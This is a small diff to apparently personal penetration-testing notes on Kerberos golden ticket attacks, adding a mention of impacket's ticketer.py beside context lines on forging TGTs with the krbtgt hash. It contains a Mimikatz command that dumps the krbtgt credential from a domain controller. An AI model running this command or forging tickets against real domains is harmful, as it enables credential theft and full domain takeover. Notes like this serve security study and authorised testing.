@@ -4,6 +4,8 @@ Requires krbtgt password or NTLM hash, to forge a TGT.
 once you have hash for krbtgt
 Rewrite TGTs
 
+impacket ticketer.py
+
 ## Get info - Mimikatz
 ```
 lsadump::lsa /inject /name:krbtgt
